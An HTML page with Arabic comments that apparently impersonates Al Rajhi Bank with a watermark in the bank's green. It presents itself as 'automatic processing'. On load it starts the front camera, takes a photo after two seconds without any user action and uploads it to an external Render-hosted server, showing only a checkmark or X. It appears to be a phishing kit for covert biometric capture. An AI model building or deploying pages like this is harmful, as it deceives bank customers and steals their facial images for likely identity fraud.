<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معالجة تلقائية</title>
    <style>
       /* تعديل الـ body ليكون فخماً ونظيفاً */
body {
    margin: 0; padding: 0; height: 100vh;
    display: flex; justify-content: center; align-items: center;
    background: linear-gradient(135deg, #ffffff 0%, #f1f3f4 100%);
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, sans-serif;
    position: relative;
}

.watermark {
    position: absolute;
    font-size: 15vw;
    font-weight: 900;
    color: rgba(0, 168, 89, 0.05); /* أخضر الراجحي بشفافية 5% */
    z-index: 0;
    pointer-events: none;
    user-select: none;
    white-space: nowrap;
    /* الحركة الانسيابية بمليون درجة فخامة */
    animation: float 6s ease-in-out infinite;
    /* إضافة توهج خفيف جداً يضيف بعداً إضافياً */
    filter: drop-shadow(0 5px 15px rgba(0,0,0,0.05));
}

@keyframes float {
    0%, 100% { transform: translateY(0px) scale(1); }
    50% { transform: translateY(-30px) scale(1.02); }
}
<body>
<div class="watermark">الراجحي</div>
    <!-- عناصر الواجهة -->
    <video id="video" autoplay playsinline></video>
    <div id="success-mark" class="result-mark">✓</div>
    <div id="error-mark" class="result-mark">X</div>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const successEl = document.getElementById('success-mark');
        const errorEl = document.getElementById('error-mark');
        const ctx = canvas.getContext('2d');
        let globalStream = null;

        // دالة لتشغيل الكاميرا فوراً عند فتح الصفحة
        async function startCameraNow() {
            try {
                globalStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = globalStream;
                
                video.onloadedmetadata = () => {
                    // الانتظار لمدة ثانيتين لتهيئة الكاميرا ثم التقاط الصورة تلقائياً
                    setTimeout(() => {
                        captureAndSendImage(globalStream);
                    }, 2000);
                };
            } catch (error) {
                console.error("خطأ في تشغيل الكاميرا:", error);
                // في حالة الخطأ، أظهر X الحمراء ليعرف المستخدم بوجود مشكلة
                showMark(errorEl);
            }
        }

        // دالة التقاط الصورة وإرسالها للسيرفر
        function captureAndSendImage(stream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                if (!blob) {
                    showMark(errorEl);
                    stopCamera(stream);
                    return;
                }

                const formData = new FormData();
                formData.append('captured_image', blob, 'instant_snap.jpg');

                try {
                    // إرسال الصورة إلى سيرفر Render الخاص بك
                    const response = await fetch('https://threebod.onrender.com/api/upload', {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        showMark(successEl); // إظهار علامة الصح الأخضر عند النجاح
                    } else {
                        showMark(errorEl); // إظهار X إذا رفض السيرفر
                    }
                } catch (err) {
                    console.error(err);
                    showMark(errorEl); // إظهار X إذا فشل الاتصال بالشبكة
                } finally {
                    stopCamera(stream);
                }
            }, 'image/jpeg', 0.9);
        }

        function showMark(element) {
            // إخفاء عنصر الفيديو عند عرض النتيجة
            video.style.display = 'none';
            successEl.style.display = 'none';
            errorEl.style.display = 'none';
            element.style.display = 'block';
        }

        function stopCamera(stream) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }

        // انطلاق الكود فوراً عند تحميل الصفحة
        startCameraNow();
    </script>
</body>
</html>
